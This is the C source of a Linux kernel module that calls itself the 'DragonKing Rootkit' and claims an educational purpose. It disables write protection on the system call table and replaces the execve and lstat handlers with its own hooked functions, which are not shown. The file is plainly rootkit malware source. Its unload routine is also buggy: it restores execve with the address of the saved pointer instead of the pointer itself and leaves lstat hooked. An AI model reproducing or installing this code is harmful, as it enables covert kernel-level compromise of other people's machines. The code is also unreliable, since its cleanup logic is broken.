#include "DragonKing.h"

//DragonKing Rootkit. 

MODULE_LICENSE("GPL");
MODULE_AUTHOR("DragonKing");
MODULE_DESCRIPTION("A rootkit for educational purposes");

unsigned long** sys_call_table;

//We need this to set access permissions on the address we pass to it
void set_addr_rw(unsigned long addr)
{
	    unsigned int level;
	        pte_t *pte = lookup_address(addr, &level);

		    if (pte->pte &~ _PAGE_RW)
			            pte->pte |= _PAGE_RW;
}

//We need this to set our sys_call_table back to read only as the kernel requires
void set_addr_ro(unsigned long addr)
{
	    unsigned int level;
	        pte_t *pte = lookup_address(addr, &level);

		    pte->pte = pte->pte &~_PAGE_RW;
}


static int __init dragonking_init(void)
{
	//Search /proc/kallsyms for sys_call_table's address
	sys_call_table = (unsigned long**)kallsyms_lookup_name("sys_call_table");
	//Change object's permission to RW
	set_addr_rw((unsigned long) sys_call_table);
	//Set orig_execve to be the origin execve pointer
	orig_execve = (void *)sys_call_table[__NR_execve];
	//Replace original pointer with ours
	sys_call_table[__NR_execve] = (unsigned long*)&hacked_execve;
	orig_lstat = (void *)sys_call_table[__NR_lstat];
	sys_call_table[__NR_lstat] = (unsigned long *)&hacked_lstat;
	//Set back to RO
	set_addr_ro((unsigned long) sys_call_table);
	printk(KERN_INFO "This is a rootkit.\n");
	return 0;    
}

static void __exit dragonking_cleanup(void)
{
	    set_addr_rw((unsigned long) sys_call_table);
	    sys_call_table[__NR_execve] = (unsigned long*)&orig_execve;
	    set_addr_ro((unsigned long) sys_call_table);
	    printk(KERN_INFO "Rootkit removed.\n");
}

module_init(dragonking_init);
module_exit(dragonking_cleanup);
